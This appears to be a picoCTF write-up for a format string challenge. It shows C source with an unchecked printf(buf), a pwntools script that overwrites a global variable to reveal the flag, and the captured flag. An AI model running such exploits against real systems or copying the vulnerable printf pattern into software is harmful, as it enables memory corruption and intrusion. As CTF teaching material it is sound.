The goal is to manipulate the global variable `sus` to equal `0x67616c66`, which corresponds to the ASCII string `'flag'` in little-endian. If successful, the program will read and display the contents of `flag.txt`.



A portion of the provided C source code is as follows:

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
    char buf[1024];
    char flag[64];

    printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
    fflush(stdout);
    scanf("%1024s", buf);
    printf("Here's your input: ");
    printf(buf);
    printf("\n");
    fflush(stdout);

    if (sus == 0x67616c66) {
        printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

        FILE *fd = fopen("flag.txt", "r");
        fgets(flag, 64, fd);

        printf("%s", flag);
        fflush(stdout);
    } else {
        printf("sus = 0x%x\n", sus);
        printf("You can do better!\n");
        fflush(stdout);
    }

    return 0;
}
```



The `printf(buf)` line is the key vulnerability. Since the contents of `buf` are directly passed to `printf` without format string specifiers, the program is susceptible to arbitrary format string evaluation. This allows reading or writing arbitrary memory if the input string is crafted correctly.

The objective is to overwrite the global variable `sus` (at address `0x404060`) with the value `0x67616c66`.



Manually crafting a format string payload to perform arbitrary memory writes is complex and error-prone due to the need for precise stack positioning and padding. Instead, this process can be automated using the `pwntools` library, which provides the `FmtStr` and `fmtstr_payload()` utilities to facilitate exploitation.

The steps involved in the exploitation are:

1. Automatically detect the format string offset using `FmtStr`.
2. Use `fmtstr_payload()` to generate a payload that performs the desired write.
3. Send the payload to the remote server.
4. Receive the output containing the flag.

### Exploit 

```python
from pwn import *

context.binary = ELF('./vuln', checksec=False)
context.log_level = 'debug'  # Optional: shows full interaction


def exec_fmt(payload):
    io = remote('rhea.picoctf.net', 61118)
    io.sendline(payload)
    return io.recvall()

# Automatically detect offset
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
log.success(f"Detected format string offset: {offset}")

# Format string payload to write 'flag' (0x67616c66) to 0x404060
writes = {
    0x404060: 0x67616c66
}
payload = fmtstr_payload(offset, writes)

# Send final payload
p = remote('rhea.picoctf.net', 61118)
p.sendline(payload)

# Get and display flag
flag = p.recvall()
print(flag.decode())

```

### Result

Upon execution, the program responds with:

```
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}
```

This confirms that the value at `sus` was successfully overwritten, triggering the conditional branch that reads and prints the flag.

![image](https://github.com/user-attachments/assets/2c236074-ce0b-42ef-9627-e17d201be7ef)


